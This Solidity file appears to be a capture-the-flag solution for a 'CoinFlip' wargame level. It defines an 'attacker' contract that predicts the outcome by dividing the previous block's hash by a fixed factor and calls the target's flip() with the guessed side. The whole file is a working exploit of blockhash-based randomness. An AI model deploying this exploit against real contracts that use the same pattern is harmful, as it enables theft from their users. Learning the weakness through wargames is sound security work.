// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./CoinFlip.sol";

contract attacker {

  CoinFlip coinFlipSC;

  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipSC){
        coinFlipSC = _coinFlipSC;
    }

  function attack() public returns(bool){

    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    require(lastHash != blockValue, "The lastHash is the same as the blockValue");

    bool side = coinFlip == 1 ? true : false;

    coinFlipSC.flip(side);

    return side;
  }
}
